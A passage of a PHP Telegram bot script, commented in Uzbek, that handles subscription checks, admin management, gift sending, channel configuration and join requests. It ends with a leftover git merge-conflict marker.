                        . "🕒 Vaqt: " . date('d.m.Y H:i:s'),
                'parse_mode' => 'HTML'
            ]);
        }
    }
    exit();
}

// ========== CALLBACK QUERY HANDLER ==========
if ($callback_query) {
    $data = $callback_query['data'];
    $cid2 = $callback_query['message']['chat']['id'];
    $uid2 = $callback_query['from']['id'];
    $mid2 = $callback_query['message']['message_id'];
    $qid = $callback_query['id'];
    
    // Callback query ni javob berish
    bot('answerCallbackQuery', ['callback_query_id' => $qid]);
    
    // OBUNA TEKSHIRISH
    if ($data == 'checksuv') {
        $subscription = checkSubscription($uid2);
        if (!$subscription['status']) {
            bot('answerCallbackQuery', [
                'callback_query_id' => $qid,
                'text' => 'Hali barcha kanallarga obuna bo\'lmagansiz!',
                'show_alert' => true
            ]);
        } else {
            bot('deleteMessage', ['chat_id' => $cid2, 'message_id' => $mid2]);
            bot('sendMessage', [
                'chat_id' => $cid2,
                'text' => "✅ <b>Obunangiz tasdiqlandi!</b>",
                'parse_mode' => 'HTML',
                'reply_markup' => mainKeyboard(isAdmin($uid2))
            ]);
        }
        exit();
    }
    
    // BOT HOLATINI O'ZGARTIRISH
    if ($data == 'toggle_bot' && isAdmin($uid2)) {
        $current_status = getBotStatus();
        $new_status = $current_status == 'active' ? 'inactive' : 'active';
        $status_text = $new_status == 'active' ? '✅ Faol' : '⏸ To\'xtatilgan';
        $button_text = $new_status == 'active' ? '⏸ To\'xtatish' : '✅ Faollashtirish';
        
        setBotStatus($new_status);
        
        bot('editMessageText', [
            'chat_id' => $cid2,
            'message_id' => $mid2,
            'text' => "🤖 <b>Bot holati o'zgartirildi!</b>\n\nYangi holat: $status_text",
            'parse_mode' => 'HTML',
            'reply_markup' => json_encode([
                'inline_keyboard' => [[['text' => $button_text, 'callback_data' => 'toggle_bot', 'style' => "primary"]]]
            ])
        ]);
        exit();
    }
    
    // FOYDALANUVCHIGA XABAR YUBORISH
    if (strpos($data, 'msg_user|') === 0 && isAdmin($uid2)) {
        $user_id = explode('|', $data)[1];
        
        bot('sendMessage', [
            'chat_id' => $cid2,
            'text' => "📝 <b>Xabar yuborish</b>\n\n"
                    . "Foydalanuvchi: <code>$user_id</code>\n\n"
                    . "Yubormoqchi bo'lgan xabaringizni yozing:",
            'parse_mode' => 'HTML',
            'reply_markup' => backKeyboard()
        ]);
        
        setUserStep($uid2, 'quick_message', $user_id);
        exit();
    }
    
    // FOYDALANUVCHIGA GIFT YUBORISH
    if (strpos($data, 'gift_to_user|') === 0 && isAdmin($uid2)) {
        $user_id = explode('|', $data)[1];
        
        bot('sendMessage', [
            'chat_id' => $cid2,
            'text' => "🎁 <b>Gift yuborish</b>\n\n"
                    . "Foydalanuvchi: <code>$user_id</code>\n\n"
                    . "Gift uchun kommentariya (tabrik so'zi) yozing:",
            'parse_mode' => 'HTML',
            'reply_markup' => backKeyboard()
        ]);
        
        setUserStep($uid2, 'quick_gift_comment', $user_id);
        exit();
    }
    
    // QUICK GIFT COMMENT
    if (getUserStep($uid2) == 'quick_gift_comment' && isAdmin($uid2)) {
        $target_id = getUserTemp($uid2);
        $comment = $text;
        
        // Gift yuborish
        $res = bot('sendGift', [
            'user_id' => $target_id,
            'gift_id' => '5170233102089322756',
            'text' => $comment
        ]);

        if ($res && $res->ok) {
            logGiftSend($uid2, $target_id, '5170233102089322756', 15, $comment);
            
            bot('sendMessage', [
                'chat_id' => $cid2,
                'text' => "🎉 <b>Muvaffaqiyatli!</b>\n\nID: <code>$target_id</code> sovg'asi yuborildi.\nIzoh: <i>$comment</i>",
                'parse_mode' => 'HTML'
            ]);
        } else {
            $error_desc = $res->description ?? "Noma'lum xato";
            bot('sendMessage', [
                'chat_id' => $cid2,
                'text' => "❌ <b>Xatolik yuz berdi!</b>\n\nSababi: <code>$error_desc</code>",
                'parse_mode' => 'HTML'
            ]);
        }
        
        setUserStep($uid2, '');
        exit();
    }
    
    // ADMIN QO'SHISH
    if ($data == 'add_admin' && $uid2 == $admin_id) {
        bot('editMessageText', [
            'chat_id' => $cid2,
            'message_id' => $mid2,
            'text' => "➕ <b>Yangi admin qo'shish</b>\n\nYangi admin ID raqamini yuboring:",
            'parse_mode' => 'HTML'
        ]);
        setUserStep($uid2, 'add_admin');
        exit();
    }
    
    // ADMIN O'CHIRISH
    if ($data == 'remove_admin' && $uid2 == $admin_id) {
        bot('editMessageText', [
            'chat_id' => $cid2,
            'message_id' => $mid2,
            'text' => "➖ <b>Admin o'chirish</b>\n\nO'chirilishi kerak bo'lgan admin ID raqamini yuboring:",
            'parse_mode' => 'HTML'
        ]);
        setUserStep($uid2, 'remove_admin');
        exit();
    }
    
    // ADMINLAR RO'YXATI
    if ($data == 'list_admins') {
        $admins = getAdmins();
        $admin_text = "👥 <b>Adminlar ro'yxati</b>\n\n";
        foreach ($admins as $admin) {
            $admin_text .= "• <code>$admin</code>\n";
        }
        
        bot('editMessageText', [
            'chat_id' => $cid2,
            'message_id' => $mid2,
            'text' => $admin_text,
            'parse_mode' => 'HTML',
            'reply_markup' => json_encode([
                'inline_keyboard' => [[['text' => '🔙 Orqaga', 'callback_data' => 'back_to_admins', 'style' => "danger"]]]
            ])
        ]);
        exit();
    }
    
    // ORQAGA (adminlar)
    if ($data == 'back_to_admins') {
        $admins = getAdmins();
        $admin_text = "👥 <b>Adminlar ro'yxati</b>\n\n";
        foreach ($admins as $admin) {
            $admin_text .= "• <code>$admin</code>\n";
        }
        
        $keyboard = [];
        if ($uid2 == $admin_id) {
            $keyboard[] = [['text' => '➕ Admin qo\'shish', 'callback_data' => 'add_admin']];
            $keyboard[] = [['text' => '➖ Admin o\'chirish', 'callback_data' => 'remove_admin']];
        }
        $keyboard[] = [['text' => '📋 Adminlar ro\'yxati', 'callback_data' => 'list_admins']];
        
        bot('editMessageText', [
            'chat_id' => $cid2,
            'message_id' => $mid2,
            'text' => $admin_text,
            'parse_mode' => 'HTML',
            'reply_markup' => json_encode(['inline_keyboard' => $keyboard])
        ]);
        exit();
    }
    
    // OMMAVIY KANAL QO'SHISH
    if ($data == 'add_public' && isAdmin($uid2)) {
        bot('editMessageText', [
            'chat_id' => $cid2,
            'message_id' => $mid2,
            'text' => "➕ <b>Ommaviy kanal qo'shish</b>\n\nKanal username yuboring:\n\nMisol: <code>test_channel</code>",
            'parse_mode' => 'HTML'
        ]);
        setUserStep($uid2, 'add_public');
        exit();
    }
    
    // MAXFIY KANAL QO'SHISH
    if ($data == 'add_private' && isAdmin($uid2)) {
        bot('editMessageText', [
            'chat_id' => $cid2,
            'message_id' => $mid2,
            'text' => "➕ <b>Maxfiy kanal qo'shish</b>\n\nKanal ma'lumotlarini quyidagi formatda yuboring:\n\n"
                    . "<code>link|chat_id</code>\n\n"
                    . "<b>Misol:</b> <code>https://t.me/+AbCdEfGhIjKlMnOp|-1001234567890</code>",
            'parse_mode' => 'HTML'
        ]);
        setUserStep($uid2, 'add_private');
        exit();
    }
    
    // KANAL O'CHIRISH
    if ($data == 'remove_channel' && isAdmin($uid2)) {
        $channels = getChannels();
        if (empty($channels)) {
            bot('answerCallbackQuery', [
                'callback_query_id' => $qid,
                'text' => 'Kanallar mavjud emas!',
                'show_alert' => true
            ]);
            exit();
        }
        
        $channels_text = "➖ <b>Kanal o'chirish</b>\n\nO'chirish uchun kanal raqamini yuboring:\n\n";
        foreach ($channels as $index => $channel) {
            $number = $index + 1;
            if ($channel['type'] == 'public') {
                $channels_text .= "$number. 🌐 @" . $channel['username'] . "\n";
            } else {
                $channels_text .= "$number. 🔒 Maxfiy kanal (ID: " . $channel['chat_id'] . ")\n";
            }
        }
        
        bot('editMessageText', [
            'chat_id' => $cid2,
            'message_id' => $mid2,
            'text' => $channels_text,
            'parse_mode' => 'HTML'
        ]);
        setUserStep($uid2, 'remove_channel');
        exit();
    }
}

// ========== CHAT JOIN REQUEST HANDLER ==========
if ($chat_join_request) {
    $join_chat_id = $chat_join_request['chat']['id'];
    $join_user_id = $chat_join_request['from']['id'];
    
    // Maxfiy kanal qo'shilish so'rovi
    $tizim_dir = "tizim";
    if (!is_dir($tizim_dir)) mkdir($tizim_dir, 0777, true);
    
    $fayl_nomi = "$tizim_dir/$join_chat_id.txt";
    $ids = [];
    if (file_exists($fayl_nomi)) {
        $ids = file($fayl_nomi, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    }
    
    if (!in_array($join_user_id, $ids)) {
        $ids[] = $join_user_id;
        file_put_contents($fayl_nomi, implode(PHP_EOL, $ids) . PHP_EOL);
        
        bot('sendMessage', [
            'chat_id' => $join_user_id,
            'text' => "<b>✅ Kanalga qo'shildingiz!\n\n/start - bosing va kerakli menuni tanlang!</b>",
            'parse_mode' => 'HTML'
        ]);
    }
    exit();
}

// ========== DEFAULT RESPONSE ==========
echo "OK";
>>>>>>> 986a4aa54d157ecbc5d11f09786731e3683fb311
